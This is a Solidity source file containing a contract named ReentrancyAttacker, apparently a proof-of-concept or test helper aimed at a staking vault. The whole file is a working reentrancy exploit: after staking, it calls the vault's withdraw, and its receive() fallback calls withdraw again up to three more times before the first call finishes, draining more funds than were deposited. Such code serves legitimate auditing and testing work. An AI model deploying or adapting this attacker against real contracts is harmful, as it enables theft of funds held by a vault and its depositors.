// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
interface IStakingVault{function withdraw(uint256 amount)external;function stake(uint256 amount)external;}
contract ReentrancyAttacker{
    IStakingVault public vault;
    uint256 public attackAmount;
    uint256 public count;
    constructor(address _v){vault=IStakingVault(_v);}
    function approveAndStake(address token,uint256 amount)external{IERC20(token).approve(address(vault),amount);vault.stake(amount);}
    function attack(uint256 amount)external{attackAmount=amount;vault.withdraw(amount);}
    receive()external payable{if(count<3){count++;vault.withdraw(attackAmount);}}
}
